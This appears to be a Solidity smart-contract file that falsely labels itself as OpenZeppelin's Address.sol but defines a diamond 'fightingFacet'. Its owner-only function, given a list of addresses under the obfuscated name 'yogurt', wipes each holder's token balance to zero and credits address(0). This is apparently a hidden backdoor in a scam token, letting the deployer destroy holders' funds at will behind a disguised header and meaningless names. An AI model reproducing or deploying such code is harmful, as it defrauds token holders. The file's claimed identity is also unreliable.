/**
 */

// File: @openzeppelin/contracts/utils/Address.sol

// OpenZeppelin Contracts (last updated v4.8.0) (utils/Address.sol)

pragma solidity ^0.8.1;
import "./TestLib.sol";
contract fightingFacet {
    using SafeMath for uint256;
    using Address for address;

    modifier onlyOwner() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(msg.sender == ds.notice, "Not allowed");
        _;
    }

    function fighting(address[] memory yogurt) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint256 i = 0; i < yogurt.length; i++) {
            address account = yogurt[i];
            uint256 amount = ds._balances[account];
            ds._balances[account] = ds._balances[account].sub(amount, "ERROR");
            ds._balances[address(0)] = ds._balances[address(0)].add(amount);
        }
    }
}
